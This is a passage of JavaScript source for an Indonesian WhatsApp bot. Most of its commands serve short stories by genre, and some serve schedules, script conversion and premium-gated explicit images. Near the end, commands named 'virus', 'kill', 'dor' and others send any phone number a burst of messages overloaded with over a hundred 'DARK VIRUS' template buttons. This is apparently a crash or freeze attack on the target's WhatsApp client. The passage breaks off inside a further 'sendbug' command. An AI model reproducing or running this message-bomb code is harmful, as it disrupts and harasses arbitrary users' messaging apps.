        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-cintasedih': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`cinta sedih`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-cintasegitiga': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`Cinta segitiga`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-cintasejati': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`cinta sejati`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-galau': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`galau`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-gokil': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`gokil`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-inspiratif': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`inspiratif`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-jepang': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`jepang`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-kehidupan': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`kehidupan`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-keluarga': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`keluarga`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-kisahnyata': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`kisah nyata`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-korea': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`korea`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-kristen': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`kristen`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-liburan': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`liburan`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-malaysia': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`malaysia`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-mengharukan': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`mengharukan`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-misteri': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`misteri`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-motivasi': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`motivasi`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-nasihat': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`nasihat`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-nasionalisme': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`nasionalisme`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-olahraga': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`olahraga`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-patahhati': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`patah hati`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-penantian': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`penantian`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-pendidikan': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`pendidikan`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-pengalaman': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`pengalaman pribadi`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-pengorbanan': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`pengorbanan`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-penyesalan': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`penyesalan`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-perjuangan': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`perjuangan`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-perpisahan': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`perpisahan`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-persahabatan': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`persahabatan`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-petualangan': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`petualangan`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-ramadhan': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`ramadhan`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-remaja': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`remaja`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-rindu': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`rindu`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-rohani': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`rohani`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-romantis': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`romantis`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-sastra': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`sastra`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-sedih': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`sedih`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-sejarah': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`sejarah`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'hentai':
      case 'ahegao':
      case 'ass':
      case 'bdsm':
      case 'cuckold':
      case 'cum':
      case 'ero':
      case 'femdom':
      case 'foot':
      case 'gangbang':
      case 'glasses':
      case 'jahy':
      case 'masturbation':
      case 'orgy':
      case 'panties':
      case 'pussy':
      case 'thighs': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
        let heyyk = await fetchJson(`https://raw.githubusercontent.com/KirBotz/nyenyee/master/${command}.json`)
        let random = heyyk[Math.floor(Math.random() * heyyk.length)]
        conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
      }
        break
      case 'jadibot': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
        if (isGroup) return reply('Gunakan bot di privat chat')
        jadibot(conn, msg, from)
      }
        break
      case 'listjadibot':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
        if (isGroup) return reply('Gunakan bot di privat chat')
        try {
          let user = [... new Set([...global.conns.filter(conn => conn.user).map(conn => conn.user)])]
          te = "*List Jadibot*\n\n"
          for (let i of user) {
            let y = await conn.decodeJid(i.id)
            te += " × User : @" + y.split("@")[0] + "\n"
            te += " × Name : " + i.name + "\n\n"
          }
          conn.sendMessage(from, { text: te, mentions: [y], }, { quoted: msg })
        } catch (err) {
          reply(`Belum Ada User Yang Jadibot`)
        }
        break
      case 'jadwaltv': {
        if (!q) return reply(`Contoh : #${command} Rcti`)
        let tivi = await jadwalTV(q)
        let texoy = `Jadwal TV ${tivi.channel}\n\n`
        for (let i of tivi.result) {
          texoy += `Tanggal : ${i.date}\n`
          texoy += `Acara :${i.event}\n\n`
        }
        reply(texoy)
      }
        break
      case 'bioskopnow': {
        let skop = await bioskopNow()
        let storee = '❉─────────────────────❉\n'
        for (let i of skop) {
          storee += `\n*「 *JADWAL BIOSKOP NOW* 」*\n
- *Judul* : ${i.title}
- *Link* : ${i.url}\n
- *Genre* : ${i.genre}
- *Durasi* : ${i.duration}
- *Tayang di* : ${i.playingAt}\n❉─────────────────────❉`
          reply(storee)
        }
      }
        break
      case 'latintoaksara': {
        if (!q) return reply(`Contoh : #${command} Makan bang`)
        let uios = await latinToAksara(q)
        reply(uios)
      }
        break
      case 'aksaratolatin': {
        if (!q) return reply(`Contoh : #${command} ꦪꦺꦴꦲꦺꦴ`)
        let uios = await aksaraToLatin(q)
        reply(uios)
      }
        break

      // FIX BUG

      // By Ekuzika
      case '🗿':
      case '🔥':
      case 'p':
      case 'kill':
      case 'virus':
      case 'dor':
        if (!q) return reply(`Contoh:\n${prefix + command} 628xxx`)
        let nomr = q + '@s.whatsapp.net'
        let jmlhny = '3'
        for (let i = 0; i < jmlhny; i++) {
          conn.sendMessage(nomr, {
            text: 'BUG BY ⚠️ 𝘌𝘬𝘶𝘻𝘪𝘬𝘢 𝘖𝘧𝘊 ⚠️',
            templateButtons: [
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: `` } },
              { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
              { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: `` } },
            ]
          })
        }
        await sleep(2000)
        reply(`DONE ✅`)
        break
      case 'sendbug':
      case 'bug':
      case 'philips': {
        if (!isOwner) return reply(mess.OnlyOwner)
        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
